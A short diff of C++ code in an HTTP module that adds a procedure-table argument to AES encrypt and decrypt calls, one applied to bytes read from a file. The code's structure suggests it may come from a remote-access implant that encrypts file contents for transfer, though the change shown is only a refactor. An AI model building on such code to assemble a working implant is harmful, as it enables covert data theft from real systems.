@@ -210,7 +210,7 @@ namespace System::Http
         }
 
         // Decrypt the data
-        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc, pCrypt->pAES->hKey, pCrypt->pAES->iv);
+        std::vector<BYTE> bytes = Crypt::Decrypt(pProcs, wEnc, pCrypt->pAES->hKey, pCrypt->pAES->iv);
 		return bytes;
 	}
 
@@ -255,6 +255,7 @@ namespace System::Http
 
 		// Decrypt data
 		std::vector<BYTE> bytes = Crypt::Decrypt(
+			pProcs,
 			wEnc,
 			pCrypt->pAES->hKey,
 			pCrypt->pAES->iv
@@ -283,6 +284,7 @@ namespace System::Http
         std::vector<BYTE> bytes = System::Fs::FileRead(pProcs, wSrc);
         // Encrypt the data
         std::wstring wEnc = Crypt::Encrypt(
+			pProcs,
 			bytes,
 			pCrypt->pAES->hKey,
 			pCrypt->pAES->iv
